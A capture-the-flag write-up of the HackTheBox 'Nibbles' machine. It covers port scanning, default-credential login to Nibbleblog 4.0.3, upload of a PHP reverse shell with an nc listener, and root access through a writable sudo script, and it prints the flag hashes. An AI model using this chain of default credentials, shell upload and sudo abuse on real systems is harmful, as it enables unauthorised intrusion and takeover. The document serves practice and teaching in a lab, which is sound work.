---
title: HackTheBox - Nibbles w/o Metasploit
publishDate: 2023-09-05
author: Abhinav Kumar
image:   '~/assets/images/htb-nibbles.png'
excerpt: HackTheBox Nibbles machine is based on a old CMS vulnerability and sample privilege escalation due to permissions on file.
draft: false
category: HackTheBox
---

# Bashed

HackTheBox Link to Nibbles Machine - [HTB-Bashed](https://app.hackthebox.com/machines/nibbles)

## Nmaping Nibbles

Adding hosts file entry for bashed
```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ echo '10.10.10.75    nibbles.htb' | sudo tee /etc/hosts 
[sudo] password for abhinav: 
10.10.10.75    nibbles.htb

# Checking if the host is now rechable                                                                        
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ ping nibbles.htb
PING nibbles.htb (10.10.10.75) 56(84) bytes of data.
64 bytes from nibbles.htb (10.10.10.75): icmp_seq=1 ttl=63 time=156 ms
```
Nmap scan 

```bash
                                                                                
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap -p- -T5 nibbles.htb    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 12:22 IST
Warning: 10.10.10.75 giving up on port because retransmission cap hit (2).
Stats: 0:04:49 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 45.92% done; ETC: 12:33 (0:05:42 remaining)
Nmap scan report for nibbles.htb (10.10.10.75)
Host is up (0.16s latency).
Not shown: 64803 closed tcp ports (conn-refused), 730 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 589.78 seconds
```

No other ports found in full port scan or UDP Scan.
We will scan the two found ports 22, 80 again.

```bash
                                                                                
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ sudo nmap -sC -sV -A -O -T5 -p22,80 nibbles.htb
[sudo] password for abhinav: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 13:52 IST
Nmap scan report for nibbles.htb (10.10.10.75)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.2 - 4.9 (96%), Linux 3.8 - 3.11 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   164.09 ms 10.10.14.1
2   164.31 ms nibbles.htb (10.10.10.75)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
```

Checking the page in browser Says Hello World, but nothing more.
In the sourcecode view in browser, we se a comment 

```html
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

When we check /nibbleblog/ directory in browser we can see Nibbleblog powered CMS.
From the source-code of the nibbles, we can see some more directories that are related to CMS like /nibbleblog/themes/ , /nibbleblog/content/ 

We run a Gobuster scan to discover more

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ gobuster dir -u  http://nibbles.htb/nibbleblog/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads 200 --quiet
/admin                (Status: 301) [Size: 321] [--> http://nibbles.htb/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/plugins/]
/content              (Status: 301) [Size: 323] [--> http://nibbles.htb/nibbleblog/content/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://nibbles.htb/nibbleblog/languages/]
   
```

From the Gobuster results, we can explore few links, While checking http://nibbles.htb/nibbleblog/README , we find out the version of NibbleBlog is 4.0.3 .

```bash
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release publishDate: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com
<redacted rest of the file.>
```

A Google Search for the CMS with Version number says about few file upload vulnerabilities.

Also reading about vulnerabilities we discover the default (probably) username password for admin login are - admin:nibbles
So we login to the admin panel at - http://nibbles.htb/nibbleblog/admin.php 

![HTB - Nibbles - WebLogin](~/assets/images/htb-nibbles-web-login.png) ![HTB -Nibbles Web Loggedin](~/assets/images/htb-nibbles-web-loggedin.png)




### Initial Shell

Reading about few exploitation procedures of Nibble 4.0.3 on [this website](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html), we can try the arbitrary file upload onto my-images.

As per the explanation on the exploitation article, we can upload a PHP-reverse-shell and browse it to get shell via netcat.

The PHP Reverseshell can be taken from any website like [PentestMonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Modify to include your tun0 IP and port.
Open Port on netcat and upload the file to website

http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image

![HTB Nibbles PHP Reverse Shell Upload](~/assets/images/htb-nibbles-php-reverse-shell-upload.png)

Click "Configure" under my-images plugin to get upload page.

![HTB - Nibbles - Upload Shell](~/assets/images/htb-nibbles-upload-page.png)

Now once the shell is uploaded ( example image.php), keep netcat listner ready and browse the reverseshell at - http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php/my_image/image.php

and we get a shell.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.75] 46192
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:55:16 up  7:10,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$ whoami
nibbler
$ uname -a
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
$ 
```



### User Flag

Getting the user flag
```bash
$ ls /home
nibbler
$ cat /home/nibbler/user.txt
903ded9d1245092bff70d64505fe15fe
$ 
```



### Privilege Escalation

Let us check what privilleges we have.
```bash
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
$ 
```

We can execute the /home/nibbler/personal/stuff/monitor.sh with root privilleges without password.

Right now we cannot access as the file does not exists, I tried and later discovered , it is all in a zip file that is extracted to give the file that can executed with root permissions.

```bash
# Tryig to access the file, failed
$ cat /home/nibbler/personal/stuff/monitor.sh
cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
$ ls /home/nibbler/personal/stuff/monitor.sh
ls: cannot access '/home/nibbler/personal/stuff/monitor.sh': No such file or directory

#checking contents of home, we find zip file 
$ cd /home/nibbler
$ ls
personal.zip
user.txt

#unzip the archive
$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
$ ls -l
total 12
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 personal
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Sep  4 23:45 user.txt
$ cd personal
$ ls
stuff
$ cd stuff
$ ls
monitor.sh
```

We have finally the file that can run as root without password, the file is a bash script, and we can write / overwrite over this to execute what we want.

```bash
$ pwd
/home/nibbler/personal/stuff
$ ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
$ 
```

Let us overwrite the file to execute bash.

Inset the below into file.
```bash
#!/bin/sh
bash
```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '!#/bin/sh' > monitor.sh
echo '!#/bin/sh' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'bash' >> monitor.sh
echo 'bash' >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh  #Ignore this
!#/bin/sh
bash
```

Now Let us execute the file, assigning the execute permissions, and we would be root.

```bash
#Setting execute permissions
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
chmod +x monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 15 Sep  5 07:37 monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh  #copy the path, as executing with file name won't work
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff#
root@Nibbles:/home/nibbler/personal/stuff# whoami            
root
root@Nibbles:/home/nibbler/personal/stuff# id
uid=0(root) gid=0(root) groups=0(root)
```

So we are now root(#), lets get the root flag.

```bash
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
84522082a88d8486069bec7ca27a7cb0
root@Nibbles:/home/nibbler/personal/stuff# 
```
## Learnings

1. In case of Web (80/443) or any other web service ports exposed, source code can sometimes help to get in right direction.
2. Source code (or view source) can also help us get some directories on the machine.
3. If Gobuster or other similar tools dont give results, change endpoint to on of the directories gained from the previous Learning (L2).
4. Always check the overly permissive files that execute as other users and writable by the user you are.
5. In case of any Application/CMS discovered, always check for the default credentials (username:password).
